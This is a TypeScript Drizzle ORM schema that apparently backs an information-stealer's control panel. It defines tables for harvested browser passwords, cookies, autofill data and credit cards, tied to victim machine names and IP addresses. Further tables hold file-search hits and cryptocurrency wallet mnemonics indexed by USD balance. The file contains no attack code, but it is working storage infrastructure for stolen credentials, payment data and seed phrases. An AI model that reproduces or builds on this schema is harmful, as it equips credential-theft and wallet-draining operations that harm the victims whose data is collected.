import {
  pgTable,
  serial,
  text,
  timestamp,
  integer,
  jsonb,
  decimal,
  index,
} from 'drizzle-orm/pg-core';
import { users } from './users';

export const browserSubmissions = pgTable(
  'browser_submissions',
  {
    id: serial('id').primaryKey(),
    userId: integer('user_id')
      .notNull()
      .references(() => users.id),
    browser: text('browser').notNull(),
    type: text('type', {
      enum: ['autofill', 'passwords', 'history', 'cookies', 'credit_cards'],
    }).notNull(),
    data: jsonb('data').notNull(), // JSONB for better performance
    desktopName: text('desktop_name'),
    ipAddress: text('ip_address'),
    createdAt: timestamp('created_at').defaultNow(),
    searchVector: text('search_vector'), // tsvector column for full-text search - handled by migration
  },
  (table) => ({
    userIdIdx: index('browser_submissions_user_id_idx').on(table.userId),
    typeIdx: index('browser_submissions_type_idx').on(table.type),
    createdAtIdx: index('browser_submissions_created_at_idx').on(table.createdAt),
    browserIdx: index('browser_submissions_browser_idx').on(table.browser),
  }),
);

export const filesearchSubmissions = pgTable(
  'filesearch_submissions',
  {
    id: serial('id').primaryKey(),
    userId: integer('user_id')
      .notNull()
      .references(() => users.id),
    line: text('line').notNull(),
    pattern: text('pattern').notNull(),
    data: jsonb('data').notNull(),
    ipAddress: text('ip_address'),
    createdAt: timestamp('created_at').defaultNow(),
    // searchVector: text('search_vector'), // tsvector column for full-text search - handled by migration
  },
  (table) => ({
    userIdIdx: index('filesearch_submissions_user_id_idx').on(table.userId),
    patternIdx: index('filesearch_submissions_pattern_idx').on(table.pattern),
    createdAtIdx: index('filesearch_submissions_created_at_idx').on(table.createdAt),
  }),
);

export const walletSubmissions = pgTable(
  'wallet_submissions',
  {
    id: serial('id').primaryKey(),
    userId: integer('user_id')
      .notNull()
      .references(() => users.id),
    wallet: text('wallet').notNull(),
    mnemonic: text('mnemonic').notNull(),
    balanceUsd: decimal('balance_usd', { precision: 18, scale: 8 }),
    ipAddress: text('ip_address'),
    createdAt: timestamp('created_at').defaultNow(),
    // searchVector: text('search_vector'), // tsvector column for full-text search - handled by migration
  },
  (table) => ({
    userIdIdx: index('wallet_submissions_user_id_idx').on(table.userId),
    balanceIdx: index('wallet_submissions_balance_idx').on(table.balanceUsd),
    createdAtIdx: index('wallet_submissions_created_at_idx').on(table.createdAt),
    walletIdx: index('wallet_submissions_wallet_idx').on(table.wallet),
  }),
);

export type BrowserSubmission = typeof browserSubmissions.$inferSelect;
export type NewBrowserSubmission = typeof browserSubmissions.$inferInsert;

export type FilesearchSubmission = typeof filesearchSubmissions.$inferSelect;
export type NewFilesearchSubmission = typeof filesearchSubmissions.$inferInsert;

export type WalletSubmission = typeof walletSubmissions.$inferSelect;
export type NewWalletSubmission = typeof walletSubmissions.$inferInsert;
